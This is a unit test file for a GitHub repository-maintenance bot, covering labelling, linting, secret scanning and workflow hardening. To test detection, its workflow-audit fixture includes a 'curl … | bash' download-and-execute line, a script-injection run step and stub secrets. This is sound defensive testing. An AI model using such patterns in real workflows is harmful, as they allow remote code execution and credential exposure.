/*!
 * @authormark v1 -- do not remove (authorship watermark)
 * Copyright (c) 2026 Srinivasan Vijayaraghavan <srinivasan.shyam2000@gmail.com>
 * Author: https://github.com/Srinivasan-78
 * SPDX-License-Identifier: MIT
 * Fingerprint: AMK1.yXAqn7RdwsTQMANZkNm_1l
 */
// Unit tests for the pure classifiers, linter and report builder in bot.mjs.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { execFileSync } from 'node:child_process';
import {
  classifyPullRequest, classifyIssue, sanitize,
  buildMarkdownReport, lintRepository, applyRepoOverrides,
  auditWorkflow, pinWorkflowActions, scanGitHistory,
  classifyBranchPr, buildDependabotConfig,
  buildReuseToml, detectPublish, buildProvenanceWorkflow,
  retargetAuthormarkPrGate, addWorkflowPermissions,
} from '../bot.mjs';

// ---------------------------------------------------------------- classifyPullRequest

test('PR size label is derived from per-file diff stats when the PR lacks totals', () => {
  const pr = { title: 'chore: tidy', labels: [], head: { ref: 'chore/tidy' } };
  const files = [
    { filename: 'a.js', additions: 200, deletions: 100 },
    { filename: 'b.js', additions: 30, deletions: 5 },
  ];
  const { allComputed } = classifyPullRequest(pr, files, {});
  assert.ok(allComputed.includes('size/L')); // 335 lines -> L (250..999)
});

test('PR size label prefers explicit additions/deletions from the full payload', () => {
  const pr = { title: 'x', labels: [], additions: 1500, deletions: 0, head: { ref: 'x' } };
  const { allComputed } = classifyPullRequest(pr, [], {});
  assert.ok(allComputed.includes('size/XL'));
});

test('PR type and language labels come from the title and changed files', () => {
  const pr = { title: 'feat: add parser', labels: [], head: { ref: 'feat/parser' } };
  const files = [{ filename: 'src/parser.ts' }, { filename: 'src/parser.test.ts' }];
  const { allComputed } = classifyPullRequest(pr, files, {});
  assert.ok(allComputed.includes('type/feat'));
  assert.ok(allComputed.includes('lang/typescript'));
  assert.ok(allComputed.includes('needs-review'));
});

test('PR already carrying a label is not handed it again', () => {
  const pr = {
    title: 'fix: crash', labels: [{ name: 'type/fix' }], head: { ref: 'fix/crash' },
    additions: 3, deletions: 1,
  };
  const { toAdd } = classifyPullRequest(pr, [], {});
  assert.ok(!toAdd.includes('type/fix'));
  assert.ok(toAdd.includes('size/XS'));
});

test('bot-authored dependency PRs are tagged bot + dependencies', () => {
  const pr = {
    title: 'Bump lodash from 4.17.20 to 4.17.21', labels: [],
    head: { ref: 'dependabot/npm_and_yarn/lodash-4.17.21' },
    user: { login: 'dependabot[bot]' }, additions: 2, deletions: 2,
  };
  const { allComputed } = classifyPullRequest(pr, [], {});
  assert.ok(allComputed.includes('bot'));
  assert.ok(allComputed.includes('type/dependencies'));
});

// ---------------------------------------------------------------- classifyIssue

test('security issues are tagged security + priority/high', () => {
  const { allComputed } = classifyIssue({ title: 'token leak in logs', body: 'a credential is printed', labels: [] }, {});
  assert.ok(allComputed.includes('security'));
  assert.ok(allComputed.includes('priority/high'));
});

test('a terse bug report is flagged needs-info', () => {
  const { allComputed } = classifyIssue({ title: 'it crashes', body: 'broken', labels: [] }, {});
  assert.ok(allComputed.includes('bug'));
  assert.ok(allComputed.includes('needs-info'));
});

test('an unlabelled, uncategorisable issue defaults to triage', () => {
  const { allComputed } = classifyIssue({ title: 'thoughts on naming', body: '', labels: [] }, {});
  assert.deepEqual(allComputed, ['triage']);
});

// ---------------------------------------------------------------- sanitize

test('sanitize redacts GitHub tokens', () => {
  assert.equal(sanitize('using ghp_' + 'A'.repeat(36) + ' now'), 'using *** now');
  assert.equal(sanitize('github_pat_' + 'B'.repeat(82)), '***');
  assert.equal(sanitize(''), '');
});

// ---------------------------------------------------------------- buildMarkdownReport

test('report announces all-clear when nothing is wrong', () => {
  const md = buildMarkdownReport({ owner: 'ada' }, {
    total: 3, scannedTime: '2026-01-01T00:00:00Z',
    authormark: { clean: ['r1', 'r2', 'r3'], drifted: [], unmarked: [], fixed: [], fixFailed: [] },
    lintFindings: [], lintFixed: [], prsTagged: [], issuesTagged: [], failedRepos: [],
  });
  assert.match(md, /All Systems Nominal/);
  assert.match(md, /@ada/);
});

test('report lists drifted repositories under an attention heading', () => {
  const md = buildMarkdownReport({ owner: 'ada' }, {
    total: 1, scannedTime: 't',
    authormark: { clean: [], drifted: [{ name: 'r1', details: '2 stale' }], unmarked: [], fixed: [], fixFailed: [] },
    lintFindings: [], lintFixed: [], prsTagged: [], issuesTagged: [], failedRepos: [],
  });
  assert.match(md, /Attention Needed/);
  assert.match(md, /`r1` — 2 stale/);
});

// ---------------------------------------------------------------- classifyBranchPr

test('classifyBranchPr distinguishes merged / open / closed-unmerged / none', () => {
  const prs = [
    { number: 3, state: 'closed', merged_at: null, head: { ref: 'authormark' } },
    { number: 7, state: 'open', merged_at: null, head: { ref: 'authormark' } },
    { number: 5, state: 'closed', merged_at: '2026-01-01T00:00:00Z', head: { ref: 'authormark' } },
    { number: 9, state: 'open', merged_at: null, head: { ref: 'other' } },
  ];
  // Newest matching PR (#7) wins -> still OPEN, not merged.
  assert.deepEqual(classifyBranchPr(prs, 'authormark').status, 'OPEN');
  assert.equal(classifyBranchPr(prs, 'authormark').pr.number, 7);

  assert.equal(classifyBranchPr([prs[2]], 'authormark').status, 'MERGED');
  assert.equal(classifyBranchPr([prs[0]], 'authormark').status, 'CLOSED');
  assert.equal(classifyBranchPr(prs, 'no-such-branch').status, 'NONE');
  assert.equal(classifyBranchPr([], 'authormark').status, 'NONE');
});

// ---------------------------------------------------------------- buildDependabotConfig

test('buildDependabotConfig groups every ecosystem into one catch-all PR', () => {
  const yml = buildDependabotConfig(['npm', 'github-actions']);
  assert.match(yml, /package-ecosystem: "npm"/);
  assert.match(yml, /package-ecosystem: "github-actions"/);
  assert.match(yml, /npm-all:/);
  assert.match(yml, /github-actions-all:/);
  assert.match(yml, /open-pull-requests-limit: 10/);
  assert.match(yml, /patterns: \["\*"\]/);
  assert.match(yml, /update-types: \["major", "minor", "patch"\]/);
  // Two ecosystems -> two grouped blocks.
  assert.equal((yml.match(/groups:/g) || []).length, 2);
});

test('lintRepository flags an ungrouped Dependabot config', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lint-dependabot-'));
  try {
    fs.mkdirSync(path.join(dir, '.github'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.github', 'dependabot.yml'),
      'version: 2\nupdates:\n  - package-ecosystem: "npm"\n    directory: "/"\n    schedule:\n      interval: "weekly"\n');
    const f = lintRepository(dir, 'ungrouped');
    assert.ok(f.standards.some(s => /not grouped/.test(s)));

    fs.writeFileSync(path.join(dir, '.github', 'dependabot.yml'), buildDependabotConfig(['npm']));
    const f2 = lintRepository(dir, 'grouped');
    assert.ok(!f2.standards.some(s => /not grouped/.test(s)));
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('report surfaces a hygiene fix that failed instead of dropping it', () => {
  const md = buildMarkdownReport({ owner: 'ada' }, {
    total: 1, scannedTime: 't',
    authormark: { clean: [], drifted: [], unmarked: [], fixed: [], fixFailed: [] },
    lintFindings: [], lintFixed: [], awaitingMerge: [],
    lintFixFailed: [{ name: 'r1', reason: 'git push rejected: stale info' }],
    prsTagged: [], issuesTagged: [], failedRepos: [],
  });
  assert.match(md, /Hygiene Fix Failed/);
  assert.match(md, /`r1`: git push rejected: stale info/);
  assert.match(md, /Attention Needed/);
});

// ---------------------------------------------------------------- lintRepository

test('lintRepository reports every missing standard file in a bare repo', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lint-bare-'));
  try {
    const f = lintRepository(dir, 'bare');
    const joined = f.standards.join('\n');
    for (const want of ['LICENSE', 'README.md', '.gitignore', 'SECURITY.md']) {
      assert.match(joined, new RegExp(want.replace('.', '\\.')));
    }
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('lintRepository flags a committed private key and a tracked .env', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lint-secret-'));
  try {
    fs.writeFileSync(path.join(dir, 'id_rsa'), '-----BEGIN RSA PRIVATE KEY-----\nMIIabc\n-----END RSA PRIVATE KEY-----\n');
    fs.writeFileSync(path.join(dir, '.env'), 'API_TOKEN=hunter2\n');
    const f = lintRepository(dir, 'leaky');
    assert.ok(f.secrets.some(s => /Private Key/.test(s)));
    assert.ok(f.secrets.some(s => /environment file/.test(s)));
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('lintRepository catches invalid JSON', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lint-json-'));
  try {
    fs.writeFileSync(path.join(dir, 'data.json'), '{ "a": 1, }\n');
    const f = lintRepository(dir, 'badjson');
    assert.ok(f.syntaxErrors.some(s => /data\.json/.test(s)));
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------- workflow audit

test('auditWorkflow flags pull_request_target head checkout, unpinned actions, script injection', () => {
  const wf = [
    'name: x', 'on:', '  pull_request_target:', 'jobs:', '  a:',
    '    runs-on: ubuntu-latest', '    steps:',
    '      - uses: actions/checkout@v4', '        with:',
    '          ref: ${{ github.event.pull_request.head.sha }}',
    '      - uses: some/thing@main',
    '      - run: echo ${{ github.event.issue.title }}',
    '      - run: curl http://x/i.sh | bash', '',
  ].join('\n');
  const r = auditWorkflow(wf, 'wf.yml').join(' || ');
  assert.match(r, /pull_request_target/);
  assert.match(r, /pinned to a tag/);
  assert.match(r, /no top-level `permissions:`/);
  assert.match(r, /github\.event\.\* }}` used in a `run:`/);
  assert.match(r, /download straight into a shell/);
});

test('auditWorkflow is quiet on a well-formed workflow', () => {
  const wf = [
    'name: ci', 'on: [push]', 'permissions:', '  contents: read', 'jobs:', '  t:',
    '    runs-on: ubuntu-latest', '    steps:',
    `      - uses: actions/checkout@${'a'.repeat(40)}`, '      - run: npm test', '',
  ].join('\n');
  assert.deepEqual(auditWorkflow(wf, 'ci.yml'), []);
});

test('pinWorkflowActions rewrites tags to SHAs and keeps the tag as a comment', () => {
  const wf = 'steps:\n  - uses: actions/checkout@v4\n  - uses: local/x@v1\n';
  const map = new Map([['actions/checkout@v4', 'f'.repeat(40)]]);
  const { text, changes } = pinWorkflowActions(wf, map);
  assert.equal(changes.length, 1);
  assert.match(text, new RegExp(`actions/checkout@${'f'.repeat(40)}  # v4`));
  assert.match(text, /local\/x@v1/); // untouched -- not in the map
});

test('scanGitHistory surfaces a secret that was committed then deleted', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'hist-'));
  const git = (...a) => execFileSync('git', a, { cwd: dir, stdio: 'ignore' });
  try {
    git('init', '-q');
    git('config', 'user.email', 't@e.co');
    git('config', 'user.name', 'T');
    fs.writeFileSync(path.join(dir, 'app.js'), 'const k = "AKIA' + 'ABCDEFGHIJKLMNOP' + '"\n');
    git('add', '-A'); git('commit', '-qm', 'add key');
    fs.writeFileSync(path.join(dir, 'app.js'), 'const k = process.env.K\n');
    git('add', '-A'); git('commit', '-qm', 'remove key');
    const hits = scanGitHistory(dir);
    assert.ok(hits.some(h => /app\.js/.test(h) && /history/.test(h)));
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------- repo overrides

test('applyRepoOverrides merges a repo .masterbot.json without losing defaults', () => {
  const base = {
    owner: 'x', features: {
      authormark: { enabled: true, autoFix: true, branch: 'authormark' },
      lint: { enabled: true, autoFix: true }, prTagger: {}, issueTagger: {},
    },
  };
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mb-'));
  try {
    fs.writeFileSync(path.join(dir, '.masterbot.json'),
      JSON.stringify({ features: { authormark: { autoFix: false } } }));
    const o = applyRepoOverrides(base, dir);
    assert.equal(o.features.authormark.autoFix, false);
    assert.equal(o.features.authormark.branch, 'authormark'); // preserved
    assert.equal(o.features.lint.autoFix, true);              // untouched
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('applyRepoOverrides returns the same object when no override file exists', () => {
  const base = { owner: 'x', features: { authormark: {}, lint: {}, prTagger: {}, issueTagger: {} } };
  assert.equal(applyRepoOverrides(base, os.tmpdir()), base);
});

test('lintRepository flags a package.json/LICENSE licence mismatch', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lic-'));
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'x', license: 'Apache-2.0' }));
    fs.writeFileSync(path.join(dir, 'LICENSE'), 'MIT License\n\nPermission is hereby granted, free of charge...\n');
    const f = lintRepository(dir, 'x');
    assert.ok(f.standards.some(s => /license "Apache-2\.0" but LICENSE is MIT/.test(s)));
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------- provenance: builders

test('buildReuseToml carries the SPDX id and the configured copyright holder', () => {
  const toml = buildReuseToml({ botIdentity: { author: 'Ada Lovelace', authorEmail: 'ada@example.com' } });
  assert.match(toml, /version = 1/);
  assert.match(toml, /path = "\*\*"/);
  assert.match(toml, /SPDX-License-Identifier = "MIT"/);
  assert.match(toml, /SPDX-FileCopyrightText = "\d{4} Ada Lovelace <ada@example\.com>"/);
});

test('detectPublish recognises npm, other, and none', () => {
  const npmDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pub-npm-'));
  const otherDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pub-other-'));
  const noneDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pub-none-'));
  try {
    fs.writeFileSync(path.join(npmDir, 'package.json'), JSON.stringify({ name: 'x', scripts: { release: 'np' } }));
    assert.equal(detectPublish(npmDir), 'npm');

    fs.mkdirSync(path.join(otherDir, '.github', 'workflows'), { recursive: true });
    fs.writeFileSync(path.join(otherDir, '.github', 'workflows', 'release.yml'), 'name: release\n');
    assert.equal(detectPublish(otherDir), 'other');

    fs.writeFileSync(path.join(noneDir, 'README.md'), '# x\n');
    assert.equal(detectPublish(noneDir), null);
  } finally {
    for (const d of [npmDir, otherDir, noneDir]) fs.rmSync(d, { recursive: true, force: true });
  }
});

test('buildProvenanceWorkflow always lints REUSE; gates authorship + attestation on inputs', () => {
  const bare = buildProvenanceWorkflow({});
  assert.match(bare, /pipx run reuse lint/);
  assert.doesNotMatch(bare, /verify-authorship/);
  assert.doesNotMatch(bare, /attest-build-provenance/);
  // Every action reference is SHA-pinned (40 hex) where we ship a known SHA.
  assert.match(bare, /actions\/checkout@[0-9a-f]{40}\s+# v/);

  const full = buildProvenanceWorkflow({ hasAuthormark: true, publishKind: 'npm' });
  assert.match(full, /verify-authorship:/);
  assert.match(full, /if: github\.event_name == 'push'/);
  assert.match(full, /mode: check\b/);
  assert.match(full, /release:\n\s+types: \[published\]/);
  assert.match(full, /attest:/);
  assert.match(full, /id-token: write/);
  assert.match(full, /subject-path: '\*\.tgz'/);
});

// ---------------------------------------------------------------- provenance: workflow rewrites

test('retargetAuthormarkPrGate downgrades a PR-triggered full check to presence', () => {
  const wf = [
    'on:', '  pull_request:', '  push:', '    branches: [main]',
    'jobs:', '  check:', '    steps:',
    '      - uses: Srinivasan-78/authormark-watch@main',
    '        with:', '          mode: check', '          path: .',
  ].join('\n');
  const { text, changed } = retargetAuthormarkPrGate(wf);
  assert.equal(changed, true);
  assert.match(text, /mode: check-presence/);
  assert.doesNotMatch(text, /mode: check\n/);
});

test('retargetAuthormarkPrGate adds --presence to a bare CLI check in a pull_request-only workflow', () => {
  const wf = 'on:\n  pull_request:\njobs:\n  x:\n    steps:\n      - run: node .authormark/authormark.mjs check .\n';
  const { text, changed } = retargetAuthormarkPrGate(wf);
  assert.equal(changed, true);
  assert.match(text, /authormark\.mjs check --presence \./);
});

test('retargetAuthormarkPrGate does NOT blanket-downgrade a CLI check when the workflow also runs on push', () => {
  const wf = 'on:\n  pull_request:\n  push:\n    branches: [main]\njobs:\n  x:\n    steps:\n      - run: node .authormark/authormark.mjs check .\n';
  const { text, changed } = retargetAuthormarkPrGate(wf);
  assert.equal(changed, false);
  assert.equal(text, wf);
});

test('retargetAuthormarkPrGate leaves a push-only, non-authormark workflow untouched', () => {
  const wf = 'on:\n  push:\n    branches: [main]\njobs:\n  build:\n    steps:\n      - run: npm test\n';
  const { text, changed } = retargetAuthormarkPrGate(wf);
  assert.equal(changed, false);
  assert.equal(text, wf);
});

test('addWorkflowPermissions inserts a least-privilege block only when none exists', () => {
  const without = 'name: ci\non:\n  pull_request:\njobs:\n  test:\n    runs-on: ubuntu-latest\n';
  const a = addWorkflowPermissions(without);
  assert.equal(a.changed, true);
  assert.match(a.text, /permissions:\n  contents: read\n\njobs:/);

  const withPerms = 'name: ci\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n';
  const b = addWorkflowPermissions(withPerms);
  assert.equal(b.changed, false);
  assert.equal(b.text, withPerms);
});

// ---------------------------------------------------------------- provenance: report section

test('buildMarkdownReport renders the provenance section and manual gh command', () => {
  const md = buildMarkdownReport({ owner: 'ada' }, {
    total: 2, scannedTime: 't',
    authormark: { clean: [], drifted: [], unmarked: [], fixed: [], fixFailed: [] },
    lintFindings: [], lintFixed: [], prsTagged: [], issuesTagged: [], failedRepos: [],
    provenance: {
      scaffolded: [{ name: 'r1', prUrl: 'http://pr/1', action: 'Opened PR', changes: ['Added `REUSE.toml`'] }],
      scaffoldFailed: [],
      governanceApplied: [{ name: 'r1' }],
      governanceSkipped: [{ name: 'r2', reason: 'GET ... failed (403)', manual: 'gh api -X PUT ...' }],
    },
  });
  assert.match(md, /Provenance, Signing & Workflow Hardening/);
  assert.match(md, /\[Opened PR\]\(http:\/\/pr\/1\)/);
  assert.match(md, /Signed-Commit Gate Enforced/);
  assert.match(md, /Administration: Read and Write/);
  assert.match(md, /gh api -X PUT/);
});
